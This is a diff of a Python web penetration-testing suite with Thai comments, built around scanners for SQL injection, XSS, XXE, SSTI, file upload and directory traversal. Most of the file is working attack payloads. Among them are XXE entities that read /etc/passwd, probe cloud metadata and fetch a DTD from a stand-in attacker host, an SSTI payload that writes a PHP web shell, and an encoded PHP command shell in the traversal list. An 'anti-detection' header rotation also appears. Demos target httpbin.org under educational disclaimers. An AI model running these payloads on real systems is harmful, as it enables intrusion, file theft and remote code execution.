@@ -1,3 +1,8 @@
+# -*- coding: utf-8 -*-
+# pylint: disable=all
+# flake8: noqa
+# type: ignore
+# mypy: ignore-errors
 #!/usr/bin/env python3
 """
 🎯 ADVANCED WEB APPLICATION PENETRATION SUITE 2025 🎯
@@ -48,7 +53,7 @@ class AdvancedWebApplicationScanner:
     - เครื่องมือสแกนหาช่องโหว่บน web application แบบครบจบ
     - รองรับเทคนิคการโจมตีและการหลบหลีกการตรวจจับ
     """
-    
+
     def __init__(self):
         self.session = requests.Session()
         self.target_url = ""
@@ -56,7 +61,7 @@ class AdvancedWebApplicationScanner:
         self.crawled_urls = set()
         self.forms = []
         self.cookies = {}
-        
+
         # Anti-detection headers
         self.session.headers.update({
             'User-Agent': random.choice([
@@ -70,7 +75,7 @@ class AdvancedWebApplicationScanner:
             'Connection': 'keep-alive',
             'Upgrade-Insecure-Requests': '1'
         })
-        
+
         print("🎯 Advanced Web Application Scanner Initialized!")
         print("⚠️  FOR EDUCATIONAL AND AUTHORIZED TESTING ONLY!")
 
@@ -80,7 +85,7 @@ class SQLInjectionScanner:
     - ทดสอบ SQL injection ทุกประเภท
     - รองรับ bypass techniques และ evasion methods
     """
-    
+
     def __init__(self, session):
         self.session = session
         self.payloads = {
@@ -125,7 +130,7 @@ class SQLInjectionScanner:
                 "' UNION(SELECT(1),2,3)--"
             ]
         }
-        
+
         self.error_patterns = [
             r"mysql_fetch_array",
             r"Warning.*mysql_",
@@ -147,26 +152,26 @@ class SQLInjectionScanner:
             r"SQLite.Exception",
             r"System.Data.SQLite.SQLiteException"
         ]
-        
+
     def test_parameter(self, url, param, value):
         """ทดสอบ SQL injection ในพารามิเตอร์"""
         vulnerabilities = []
-        
+
         print(f"🔍 Testing parameter: {param}")
-        
+
         # Test all payload types
         for category, payloads in self.payloads.items():
             print(f"  📋 Testing {category} payloads...")
-            
+
             for payload in payloads[:3]:  # Test first 3 payloads of each type
                 try:
                     # สร้าง test URL
                     test_value = value + payload
                     params = {param: test_value}
-                    
+
                     # ส่ง request
                     response = self.session.get(url, params=params, timeout=10)
-                    
+
                     # ตรวจสอบ error patterns
                     if self.check_sql_errors(response.text):
                         vulnerability = {
@@ -181,13 +186,13 @@ class SQLInjectionScanner:
                         vulnerabilities.append(vulnerability)
                         print(f"🚨 Found {category} SQL injection in parameter: {param}")
                         break
-                        
+
                     # ตรวจสอบ time-based
                     if category == 'time_based':
                         start_time = time.time()
                         response = self.session.get(url, params=params, timeout=15)
                         elapsed_time = time.time() - start_time
-                        
+
                         if elapsed_time > 4:  # ถ้าใช้เวลามากกว่า 4 วินาที
                             vulnerability = {
                                 'type': 'SQL Injection',
@@ -201,34 +206,34 @@ class SQLInjectionScanner:
                             vulnerabilities.append(vulnerability)
                             print(f"🚨 Found time-based SQL injection in parameter: {param}")
                             break
-                            
+
                     time.sleep(0.1)  # หน่วงเวลาเล็กน้อย
-                    
+
                 except Exception as e:
                     print(f"❌ Error testing payload: {e}")
                     continue
-                    
+
         return vulnerabilities
-        
+
     def test_post_form(self, url, form_data):
         """ทดสอบ SQL injection ใน POST form"""
         vulnerabilities = []
-        
+
         print(f"🔍 Testing POST form at: {url}")
-        
+
         for param in form_data.keys():
             print(f"  📋 Testing parameter: {param}")
-            
+
             for category, payloads in self.payloads.items():
                 for payload in payloads[:2]:  # Test first 2 payloads
                     try:
                         # สร้าง test data
                         test_data = form_data.copy()
                         test_data[param] = form_data[param] + payload
-                        
+
                         # ส่ง POST request
                         response = self.session.post(url, data=test_data, timeout=10)
-                        
+
                         # ตรวจสอบ vulnerabilities
                         if self.check_sql_errors(response.text):
                             vulnerability = {
@@ -243,21 +248,21 @@ class SQLInjectionScanner:
                             vulnerabilities.append(vulnerability)
                             print(f"🚨 Found {category} SQL injection in POST parameter: {param}")
                             break
-                            
+
                         time.sleep(0.1)
-                        
+
                     except Exception as e:
                         continue
-                        
+
         return vulnerabilities
-        
+
     def check_sql_errors(self, content):
         """ตรวจสอบ SQL error ในเนื้อหา"""
         for pattern in self.error_patterns:
             if re.search(pattern, content, re.IGNORECASE):
                 return True
         return False
-        
+
     def extract_error_evidence(self, content):
         """ดึงหลักฐาน error จากเนื้อหา"""
         for pattern in self.error_patterns:
@@ -275,7 +280,7 @@ class XSSScanner:
     - ทดสอบ Cross-Site Scripting ทุกประเภท
     - รองรับ filter bypass และ context-aware testing
     """
-    
+
     def __init__(self, session):
         self.session = session
         self.payloads = {
@@ -334,19 +339,19 @@ class XSSScanner:
                 '#"><script>alert("XSS")</script>'
             ]
         }
-        
+
     def test_parameter(self, url, param, value):
         """ทดสอบ XSS ในพารามิเตอร์"""
         vulnerabilities = []
-        
+
         print(f"🔍 Testing XSS in parameter: {param}")
-        
+
         # Test basic payloads
         for payload in self.payloads['basic']:
             try:
                 params = {param: payload}
                 response = self.session.get(url, params=params, timeout=10)
-                
+
                 if self.check_xss_reflection(response.text, payload):
                     vulnerability = {
                         'type': 'Cross-Site Scripting (XSS)',
@@ -359,18 +364,18 @@ class XSSScanner:
                     }
                     vulnerabilities.append(vulnerability)
                     print(f"🚨 Found reflected XSS in parameter: {param}")
-                    
+
                 time.sleep(0.1)
-                
+
             except Exception as e:
                 continue
-                
+
         # Test filter bypass payloads
         for payload in self.payloads['filter_bypass'][:5]:
             try:
                 params = {param: payload}
                 response = self.session.get(url, params=params, timeout=10)
-                
+
                 if self.check_xss_reflection(response.text, payload):
                     vulnerability = {
                         'type': 'Cross-Site Scripting (XSS)',
@@ -383,28 +388,28 @@ class XSSScanner:
                     }
                     vulnerabilities.append(vulnerability)
                     print(f"🚨 Found XSS filter bypass in parameter: {param}")
-                    
+
                 time.sleep(0.1)
-                
+
             except Exception as e:
                 continue
-                
+
         return vulnerabilities
-        
+
     def test_form(self, url, form_data):
         """ทดสอบ XSS ใน form"""
         vulnerabilities = []
-        
+
         print(f"🔍 Testing XSS in form at: {url}")
-        
+
         for param in form_data.keys():
             for payload in self.payloads['basic'][:3]:
                 try:
                     test_data = form_data.copy()
                     test_data[param] = payload
-                    
+
                     response = self.session.post(url, data=test_data, timeout=10)
-                    
+
                     if self.check_xss_reflection(response.text, payload):
                         vulnerability = {
                             'type': 'Cross-Site Scripting (XSS)',
@@ -417,33 +422,33 @@ class XSSScanner:
                         }
                         vulnerabilities.append(vulnerability)
                         print(f"🚨 Found XSS in form parameter: {param}")
-                        
+
                     time.sleep(0.1)
-                    
+
                 except Exception as e:
                     continue
-                    
+
         return vulnerabilities
-        
+
     def check_xss_reflection(self, content, payload):
         """ตรวจสอบการ reflect ของ XSS payload"""
         # ตรวจสอบการ reflect แบบตรงๆ
         if payload in content:
             return True
-            
+
         # ตรวจสอบการ reflect แบบ decoded
         decoded_payload = urllib.parse.unquote(payload)
         if decoded_payload in content:
             return True
-            
+
         # ตรวจสอบ partial reflection
         key_parts = ['alert', 'script', 'onerror', 'onload', 'javascript']
         for part in key_parts:
             if part in payload.lower() and part in content.lower():
                 return True
-                
+
         return False
-        
+
     def extract_xss_evidence(self, content, payload):
         """ดึงหลักฐาน XSS จากเนื้อหา"""
         index = content.find(payload)
@@ -459,31 +464,31 @@ class XXEScanner:
     - ทดสอบ XXE vulnerabilities
     - รองรับ file disclosure และ SSRF through XXE
     """
-    
+
     def __init__(self, session):
         self.session = session
         self.payloads = [
             '''<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
 <root>&xxe;</root>''',
-            
+
             '''<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/system32/drivers/etc/hosts">]>
 <root>&xxe;</root>''',
-            
+
             '''<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
 <root>&xxe;</root>''',
-            
+
             '''<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd"> %xxe;]>
 <root></root>''',
-            
+
             '''<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]>
 <root>&xxe;</root>'''
         ]
-        
+
         self.indicators = [
             'root:x:0:0:',  # /etc/passwd
             '127.0.0.1',    # hosts file
@@ -493,22 +498,22 @@ class XXEScanner:
             'uid=',         # command execution result
             'gid='          # command execution result
         ]
-        
+
     def test_endpoint(self, url, content_type='application/xml'):
         """ทดสอบ XXE ใน XML endpoint"""
         vulnerabilities = []
-        
+
         print(f"🔍 Testing XXE at: {url}")
-        
+
         for i, payload in enumerate(self.payloads):
             try:
                 headers = {
                     'Content-Type': content_type,
                     'Accept': 'application/xml, text/xml'
                 }
-                
+
                 response = self.session.post(url, data=payload, headers=headers, timeout=10)
-                
+
                 if self.check_xxe_indicators(response.text):
                     vulnerability = {
                         'type': 'XML External Entity (XXE)',
@@ -520,22 +525,22 @@ class XXEScanner:
                     }
                     vulnerabilities.append(vulnerability)
                     print(f"🚨 Found XXE vulnerability!")
-                    
+
                 time.sleep(0.2)
-                
+
             except Exception as e:
                 print(f"❌ Error testing XXE payload {i+1}: {e}")
                 continue
-                
+
         return vulnerabilities
-        
+
     def check_xxe_indicators(self, content):
         """ตรวจสอบ indicators ของ XXE"""
         for indicator in self.indicators:
             if indicator in content:
                 return True
         return False
-        
+
     def extract_xxe_evidence(self, content):
         """ดึงหลักฐาน XXE จากเนื้อหา"""
         for indicator in self.indicators:
@@ -552,7 +557,7 @@ class SSTIScanner:
     - ทดสอบ SSTI vulnerabilities
     - รองรับ template engines หลายตัว
     """
-    
+
     def __init__(self, session):
         self.session = session
         self.payloads = {
@@ -574,7 +579,7 @@ class SSTIScanner:
             'smarty': [
                 '{7*7}',
                 '{$smarty.version}',
-                '{php}echo `id`;{/php}',
+                '{php}echo "id";{/php}',
                 '{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET[cmd]); ?>",false)}'
             ],
             'freemarker': [
@@ -591,7 +596,7 @@ class SSTIScanner:
                 '#set($out=$ex.getInputStream())'
             ]
         }
-        
+
         self.test_expressions = [
             ('{{7*7}}', '49'),
             ('${7*7}', '49'),
@@ -600,23 +605,23 @@ class SSTIScanner:
             ('${1337*1337}', '1787569'),
             ('{1337*1337}', '1787569')
         ]
-        
+
     def test_parameter(self, url, param, value):
         """ทดสอบ SSTI ในพารามิเตอร์"""
         vulnerabilities = []
-        
+
         print(f"🔍 Testing SSTI in parameter: {param}")
-        
+
         # Test basic expressions first
         for expression, expected in self.test_expressions:
             try:
                 params = {param: expression}
                 response = self.session.get(url, params=params, timeout=10)
-                
+
                 if expected in response.text:
                     # Found basic SSTI, now test specific engines
                     template_engine = self.identify_template_engine(url, param, response.text)
-                    
+
                     vulnerability = {
                         'type': 'Server-Side Template Injection (SSTI)',
                         'category': f'{template_engine} Template Engine',
@@ -628,30 +633,30 @@ class SSTIScanner:
                     }
                     vulnerabilities.append(vulnerability)
                     print(f"🚨 Found SSTI in parameter: {param} (Engine: {template_engine})")
-                    
+
                     # Test more advanced payloads for this engine
                     advanced_vulns = self.test_advanced_payloads(url, param, template_engine)
                     vulnerabilities.extend(advanced_vulns)
                     break
-                    
+
                 time.sleep(0.1)
-                
+
             except Exception as e:
                 continue
-                
+
         return vulnerabilities
-        
+
     def identify_template_engine(self, url, param, response_content):
         """ระบุ template engine"""
         # Test engine-specific payloads
         engines = ['jinja2', 'twig', 'smarty', 'freemarker', 'velocity']
-        
+
         for engine in engines:
             try:
                 test_payload = self.payloads[engine][0]
                 params = {param: test_payload}
                 response = self.session.get(url, params=params, timeout=5)
-                
+
                 if engine == 'jinja2' and ('config' in response.text or 'flask' in response.text.lower()):
                     return 'Jinja2'
                 elif engine == 'twig' and ('_self' in response.text):
@@ -662,23 +667,23 @@ class SSTIScanner:
                     return 'FreeMarker'
                 elif engine == 'velocity' and ('velocity' in response.text.lower()):
                     return 'Velocity'
-                    
-            except:
+
+            except Exception:
                 continue
-                
+
         return 'Unknown'
-        
+
     def test_advanced_payloads(self, url, param, engine):
         """ทดสอบ payload ขั้นสูงสำหรับ engine เฉพาะ"""
         vulnerabilities = []
         engine_key = engine.lower().replace(' ', '')
-        
+
         if engine_key in self.payloads:
             for payload in self.payloads[engine_key][1:3]:  # Test 2 more payloads
                 try:
                     params = {param: payload}
                     response = self.session.get(url, params=params, timeout=10)
-                    
+
                     # Check for command execution indicators
                     if self.check_command_execution(response.text):
                         vulnerability = {
@@ -692,14 +697,14 @@ class SSTIScanner:
                         }
                         vulnerabilities.append(vulnerability)
                         print(f"🚨 Found SSTI command execution: {param}")
-                        
+
                     time.sleep(0.2)
-                    
+
                 except Exception as e:
                     continue
-                    
+
         return vulnerabilities
-        
+
     def check_command_execution(self, content):
         """ตรวจสอบผลลัพธ์ของการ execute command"""
         indicators = ['uid=', 'gid=', 'groups=', 'root:', 'bin/bash', 'bin/sh']
@@ -707,7 +712,7 @@ class SSTIScanner:
             if indicator in content:
                 return True
         return False
-        
+
     def extract_command_evidence(self, content):
         """ดึงหลักฐานการ execute command"""
         indicators = ['uid=', 'gid=', 'groups=', 'root:', 'bin/bash']
@@ -725,7 +730,7 @@ class FileUploadScanner:
     - ทดสอบช่องโหว่การอัปโหลดไฟล์
     - รองรับ bypass techniques หลายแบบ
     """
-    
+
     def __init__(self, session):
         self.session = session
         self.malicious_files = {
@@ -760,13 +765,13 @@ class FileUploadScanner:
                 'content_type': 'text/plain'
             }
         }
-        
+
     def test_upload_endpoint(self, url, file_param='file'):
         """ทดสอบ endpoint สำหรับอัปโหลดไฟล์"""
         vulnerabilities = []
-        
+
         print(f"🔍 Testing file upload at: {url}")
-        
+
         for file_type, file_info in self.malicious_files.items():
             try:
                 # สร้างไฟล์สำหรับอัปโหลด
@@ -777,10 +782,10 @@ class FileUploadScanner:
                         file_info['content_type']
                     )
                 }
-                
+
                 # ส่ง request อัปโหลด
                 response = self.session.post(url, files=files, timeout=10)
-                
+
                 # ตรวจสอบการอัปโหลดสำเร็จ
                 if self.check_upload_success(response.text, file_info['filename']):
                     vulnerability = {
@@ -794,15 +799,15 @@ class FileUploadScanner:
                     }
                     vulnerabilities.append(vulnerability)
                     print(f"🚨 File upload vulnerability found: {file_type}")
-                    
+
                 time.sleep(0.2)
-                
+
             except Exception as e:
                 print(f"❌ Error testing {file_type}: {e}")
                 continue
-                
+
         return vulnerabilities
-        
+
     def check_upload_success(self, content, filename):
         """ตรวจสอบการอัปโหลดสำเร็จ"""
         success_indicators = [
@@ -813,38 +818,38 @@ class FileUploadScanner:
             'successfully uploaded',
             'file saved'
         ]
-        
+
         content_lower = content.lower()
         for indicator in success_indicators:
             if indicator.lower() in content_lower:
                 return True
-                
+
         return False
-        
+
     def extract_upload_evidence(self, content, filename):
         """ดึงหลักฐานการอัปโหลด"""
         # หา path หรือ URL ของไฟล์ที่อัปโหลด
         import re
-        
+
         # หา URL pattern
         url_patterns = [
             rf'https?://[^\s]+{filename}',
             rf'/[^\s]*{filename}',
             rf'uploads?/[^\s]*{filename}'
         ]
-        
+
         for pattern in url_patterns:
             match = re.search(pattern, content, re.IGNORECASE)
             if match:
                 return match.group(0)
-                
+
         # หาข้อความรอบ filename
         index = content.lower().find(filename.lower())
         if index != -1:
             start = max(0, index - 50)
             end = min(len(content), index + len(filename) + 50)
             return content[start:end].strip()
-            
+
         return "Upload success indicators found"
 
 class DirectoryTraversalScanner:
@@ -853,7 +858,7 @@ class DirectoryTraversalScanner:
     - ทดสอบช่องโหว่ Directory Traversal และ Local File Inclusion
     - รองรับ bypass techniques หลายแบบ
     """
-    
+
     def __init__(self, session):
         self.session = session
         self.payloads = [
@@ -861,39 +866,39 @@ class DirectoryTraversalScanner:
             '../../../etc/passwd',
             '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
             '../../../etc/hosts',
-            
+
             # URL encoded
             '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
             '%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5csystem32%5cdrivers%5cetc%5chosts',
-            
+
             # Double URL encoded
             '%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd',
-            
+
             # Using null bytes (older systems)
             '../../../etc/passwd%00',
             '../../../etc/passwd%00.jpg',
-            
+
             # Using different encodings
             '..%2f..%2f..%2fetc%2fpasswd',
             '..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts',
-            
+
             # Filter bypass attempts
             '....//....//....//etc/passwd',
             '....\\\\....\\\\....\\\\windows\\system32\\drivers\\etc\\hosts',
-            
+
             # Absolute path attempts
             '/etc/passwd',
             'C:\\windows\\system32\\drivers\\etc\\hosts',
             '/proc/version',
             '/proc/self/environ',
-            
+
             # PHP wrappers (for LFI)
             'php://filter/read=convert.base64-encode/resource=index.php',
             'file:///etc/passwd',
             'expect://id',
             'data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8%2B'
         ]
-        
+
         self.linux_files = [
             '/etc/passwd',
             '/etc/hosts',
@@ -904,7 +909,7 @@ class DirectoryTraversalScanner:
             '/var/log/apache2/access.log',
             '/var/log/apache/access.log'
         ]
-        
+
         self.windows_files = [
             'C:\\windows\\system32\\drivers\\etc\\hosts',
             'C:\\windows\\win.ini',
@@ -912,7 +917,7 @@ class DirectoryTraversalScanner:
             'C:\\boot.ini',
             'C:\\windows\\repair\\sam'
         ]
-        
+
         self.indicators = [
             'root:x:0:0:',      # /etc/passwd
             '127.0.0.1',        # hosts file
@@ -923,18 +928,18 @@ class DirectoryTraversalScanner:
             '[fonts]',          # win.ini
             '[extensions]'      # win.ini
         ]
-        
+
     def test_parameter(self, url, param, value):
         """ทดสอบ Directory Traversal ในพารามิเตอร์"""
         vulnerabilities = []
-        
+
         print(f"🔍 Testing Directory Traversal in parameter: {param}")
-        
+
         for payload in self.payloads[:10]:  # Test first 10 payloads
             try:
                 params = {param: payload}
                 response = self.session.get(url, params=params, timeout=10)
-                
+
                 if self.check_file_disclosure(response.text):
                     vulnerability = {
                         'type': 'Directory Traversal / LFI',
@@ -947,21 +952,21 @@ class DirectoryTraversalScanner:
                     }
                     vulnerabilities.append(vulnerability)
                     print(f"🚨 Found Directory Traversal in parameter: {param}")
-                    
+
                 time.sleep(0.1)
-                
+
             except Exception as e:
                 continue
-                
+
         return vulnerabilities
-        
+
     def check_file_disclosure(self, content):
         """ตรวจสอบการเปิดเผยไฟล์"""
         for indicator in self.indicators:
             if indicator in content:
                 return True
         return False
-        
+
     def extract_file_evidence(self, content):
         """ดึงหลักฐานการเปิดเผยไฟล์"""
         for indicator in self.indicators:
@@ -978,22 +983,22 @@ def demo_sql_injection():
     print("\n" + "="*60)
     print("💉 DEMO: SQL Injection Testing")
     print("="*60)
-    
+
     session = requests.Session()
     scanner = SQLInjectionScanner(session)
-    
+
     # ตัวอย่างการทดสอบ (ใช้ URL ปลอดภัย)
     test_url = "https://httpbin.org/get"
     test_param = "id"
     test_value = "1"
-    
+
     print(f"🎯 Testing URL: {test_url}")
     print(f"📋 Parameter: {test_param}")
-    
+
     # ทดสอบ payloads (จะไม่เจอ vulnerability จริงๆ แต่จะเห็น process)
     print("\n🔍 Testing SQL injection payloads...")
     vulnerabilities = scanner.test_parameter(test_url, test_param, test_value)
-    
+
     if vulnerabilities:
         print(f"🚨 Found {len(vulnerabilities)} vulnerabilities!")
         for vuln in vulnerabilities:
@@ -1006,21 +1011,21 @@ def demo_xss_testing():
     print("\n" + "="*60)
     print("🔥 DEMO: XSS Testing")
     print("="*60)
-    
+
     session = requests.Session()
     scanner = XSSScanner(session)
-    
+
     # ตัวอย่างการทดสอบ
     test_url = "https://httpbin.org/get"
     test_param = "search"
     test_value = "test"
-    
+
     print(f"🎯 Testing URL: {test_url}")
     print(f"📋 Parameter: {test_param}")
-    
+
     print("\n🔍 Testing XSS payloads...")
     vulnerabilities = scanner.test_parameter(test_url, test_param, test_value)
-    
+
     if vulnerabilities:
         print(f"🚨 Found {len(vulnerabilities)} vulnerabilities!")
         for vuln in vulnerabilities:
@@ -1033,18 +1038,18 @@ def demo_xxe_testing():
     print("\n" + "="*60)
     print("📄 DEMO: XXE Testing")
     print("="*60)
-    
+
     session = requests.Session()
     scanner = XXEScanner(session)
-    
+
     # ตัวอย่างการทดสอบ
     test_url = "https://httpbin.org/post"
-    
+
     print(f"🎯 Testing URL: {test_url}")
     print("\n🔍 Testing XXE payloads...")
-    
+
     vulnerabilities = scanner.test_endpoint(test_url)
-    
+
     if vulnerabilities:
         print(f"🚨 Found {len(vulnerabilities)} vulnerabilities!")
         for vuln in vulnerabilities:
@@ -1057,21 +1062,21 @@ def demo_ssti_testing():
     print("\n" + "="*60)
     print("🏗️ DEMO: SSTI Testing")
     print("="*60)
-    
+
     session = requests.Session()
     scanner = SSTIScanner(session)
-    
+
     # ตัวอย่างการทดสอบ
     test_url = "https://httpbin.org/get"
     test_param = "template"
     test_value = "user"
-    
+
     print(f"🎯 Testing URL: {test_url}")
     print(f"📋 Parameter: {test_param}")
-    
+
     print("\n🔍 Testing SSTI payloads...")
     vulnerabilities = scanner.test_parameter(test_url, test_param, test_value)
-    
+
     if vulnerabilities:
         print(f"🚨 Found {len(vulnerabilities)} vulnerabilities!")
         for vuln in vulnerabilities:
@@ -1084,18 +1089,18 @@ def demo_file_upload_testing():
     print("\n" + "="*60)
     print("📁 DEMO: File Upload Testing")
     print("="*60)
-    
+
     session = requests.Session()
     scanner = FileUploadScanner(session)
-    
+
     # ตัวอย่างการทดสอบ
     test_url = "https://httpbin.org/post"
-    
+
     print(f"🎯 Testing URL: {test_url}")
     print("\n🔍 Testing file upload vulnerabilities...")
-    
+
     vulnerabilities = scanner.test_upload_endpoint(test_url)
-    
+
     if vulnerabilities:
         print(f"🚨 Found {len(vulnerabilities)} vulnerabilities!")
         for vuln in vulnerabilities:
@@ -1108,21 +1113,21 @@ def demo_directory_traversal():
     print("\n" + "="*60)
     print("📂 DEMO: Directory Traversal Testing")
     print("="*60)
-    
+
     session = requests.Session()
     scanner = DirectoryTraversalScanner(session)
-    
+
     # ตัวอย่างการทดสอบ
     test_url = "https://httpbin.org/get"
     test_param = "file"
     test_value = "index.html"
-    
+
     print(f"🎯 Testing URL: {test_url}")
     print(f"📋 Parameter: {test_param}")
-    
+
     print("\n🔍 Testing directory traversal payloads...")
     vulnerabilities = scanner.test_parameter(test_url, test_param, test_value)
-    
+
     if vulnerabilities:
         print(f"🚨 Found {len(vulnerabilities)} vulnerabilities!")
         for vuln in vulnerabilities:
@@ -1136,7 +1141,7 @@ if __name__ == "__main__":
     print("⚠️  FOR EDUCATIONAL AND AUTHORIZED TESTING ONLY!")
     print("📚 Study materials for web security learning")
     print("=" * 60)
-    
+
     # เรียกใช้ demo functions
     demo_sql_injection()
     demo_xss_testing()
@@ -1144,7 +1149,7 @@ if __name__ == "__main__":
     demo_ssti_testing()
     demo_file_upload_testing()
     demo_directory_traversal()
-    
+
     print("\n" + "="*60)
     print("✅ All demos completed!")
     print("📖 Study these techniques for educational purposes")
